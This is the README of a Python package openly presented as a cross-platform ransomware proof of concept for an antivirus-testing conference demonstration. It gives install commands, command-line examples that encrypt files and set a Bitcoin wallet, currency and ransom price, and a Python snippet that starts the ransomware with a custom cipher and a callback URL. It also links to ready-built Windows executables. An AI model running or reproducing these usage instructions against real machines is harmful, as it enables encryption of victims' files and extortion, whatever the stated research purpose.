![RansomWare Logo](https://mauricelambert.github.io/info/python/security/RansomWare_small.png "RansomWare logo")

# RansomWare

## Description

This package implements a cross platform RansomWare.

> Don't use this ransomware POC for illegal purposes!
>> This project is developed to test and demonstrate the behavior of antivirus against unknown malware in the context of a specific cybersecurity conference.
>> This malware is basic, it doesn't try to bypass any antivirus, EPP or EDR protection.
>> It can't be used for red team or pentest as it will get stuck, so don't try or you'll waste your time.

## Requirements

This package require:

 - python3
 - python3 Standard Library

## Installation

### Pip

```bash
python3 -m pip install RansomWare
```

### Git

```bash
git clone "https://github.com/mauricelambert/RansomWare.git"
cd "RansomWare"
python3 -m pip install .
```

### Wget

```bash
wget https://github.com/mauricelambert/RansomWare/archive/refs/heads/main.zip
unzip main.zip
cd RansomWare-main
python3 -m pip install .
```

### cURL

```bash
curl -O https://github.com/mauricelambert/RansomWare/archive/refs/heads/main.zip
unzip main.zip
cd RansomWare-main
python3 -m pip install .
```

## Usages

## Command line

```bash
RansomWare              # Using CLI package executable
python3 -m RansomWare   # Using python module
python3 RansomWare.pyz  # Using python executable
RansomWare.exe          # Using python Windows executable

RansomWare aaa # File encryption using "aaa" as key
RansomWare -t 56 aaa # File encryption using "aaa" as key and sleep 56 secondes between file.
RansomWare -e 64 YWFh # File encryption using "aaa" as key (encoded with base64)
RansomWare -w "3LU8wRu4ZnXP4UM8Yo6kkTiGHM9BubgyiG" aaa # File encryption using "aaa" as key and using the wallet: "3LU8wRu4ZnXP4UM8Yo6kkTiGHM9BubgyiG" for ransomnote
RansomWare -c BitCoin aaa # File encryption using "aaa" as key and using the cryptocurrency: "BitCoin" for ransomnote
RansomWare -p 0.01 aaa # File encryption using "aaa" as key and using "0.01" as price
```

### Python script

```python
from RansomWare import RansomWare

def get_IV(filename: str) -> bytes:
	"""
    This function return my weak custom IV.
    """

	return filename.encode()

def crypt(key: bytes, data:bytes) -> bytes:
	"""
    This function encrypts data with key.
    """

	return bytes([(car + key[i % len(key)]) % 256 for i, car in enumerate(data)])

RansomWare(
    b"aaa",
    url="http://127.0.0.1:8000/",
    wallet="3LU8wRu4ZnXP4UM8Yo6kkTiGHM9BubgyiG",
    crypto="BitCoin",
    price="0.01",
    interval_time=56,
    encrypt=crypt,
    get_iv=get_IV,
).start()
```

## Links

 - [Pypi](https://pypi.org/project/RansomWare/)
 - [Github](https://github.com/mauricelambert/RansomWare/)
 - [Documentation](https://mauricelambert.github.io/info/python/security/RansomWare.html)
 - [Python executable](https://mauricelambert.github.io/info/python/security/RansomWare.pyz)
 - [Python Windows executable](https://mauricelambert.github.io/info/python/security/RansomWare.exe)
 - [Github - Python Windows compiled executable](https://github.com/mauricelambert/RansomWare/releases/latest/)
 - [SourceForce - Python Windows compiled executable](https://sourceforge.net/projects/RansomWare/files/)

## Licence

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
